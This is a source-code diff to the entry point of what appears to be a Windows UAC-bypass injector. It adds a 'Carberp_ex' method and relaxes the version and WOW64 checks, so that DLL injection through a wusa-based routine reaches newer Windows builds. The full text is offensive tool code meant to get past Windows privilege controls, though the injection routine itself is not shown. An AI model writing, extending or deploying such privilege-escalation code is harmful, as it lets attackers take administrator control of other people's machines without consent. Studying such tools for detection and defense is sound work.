@@ -4,9 +4,9 @@
 *
 *  TITLE:       MAIN.C
 *
-*  VERSION:     1.20
+*  VERSION:     1.30
 *
-*  DATE:        29 Mar 2015
+*  DATE:        30 Mar 2015
 *
 *  Injector entry point.
 *
@@ -104,6 +104,10 @@ VOID main()
 			OutputDebugString(TEXT("[UCM] Method Carberp selected\n\r"));
 			dwType = METHOD_CARBERP;
 		}
+		if (lstrcmpi(szBuffer, TEXT("7")) == 0) {
+			OutputDebugString(TEXT("[UCM] Method Carberp_ex selected\n\r"));
+			dwType = METHOD_CARBERP_EX;
+		}
 	}
 
 	if ((dwType == METHOD_SYSPREP_EX) && (osver.dwBuildNumber < 9600)) {
@@ -166,21 +170,25 @@ VOID main()
 		break;
 
 	case METHOD_CARBERP:
+	case METHOD_CARBERP_EX:
 
-		if (osver.dwBuildNumber > 9600) {
-			MessageBoxW(GetDesktopWindow(),
-				TEXT("This method is only for Windows 7/8/8.1"), PROGRAMTITLE, MB_ICONINFORMATION);
-			goto Done;		
+		if (dwType == METHOD_CARBERP) {
+
+			if (osver.dwBuildNumber > 9600) {
+				MessageBoxW(GetDesktopWindow(),
+					TEXT("This method is only for Windows 7/8/8.1"), PROGRAMTITLE, MB_ICONINFORMATION);
+				goto Done;
+			}
+
+			//there is no migmiz in syswow64 in 8+
+			if ((IsWow64) && (osver.dwBuildNumber > 7601)) {
+				MessageBoxW(GetDesktopWindow(),
+					WOW64STRING, PROGRAMTITLE, MB_ICONINFORMATION);
+				goto Done;
+			}
 		}
 
-		//there is no migmiz in syswow64 in 8+
-		if ((IsWow64) && (osver.dwBuildNumber > 7601)) {
-			MessageBoxW(GetDesktopWindow(),
-				WOW64STRING, PROGRAMTITLE, MB_ICONINFORMATION);
-			goto Done;
-		}
-
-		if (ucmWusaMethod(INJECTDLL, sizeof(INJECTDLL))) {
+		if (ucmWusaMethod(dwType, INJECTDLL, sizeof(INJECTDLL))) {
 			OutputDebugString(TEXT("[UCM] Carberp method called\n\r"));
 		}
 		break;
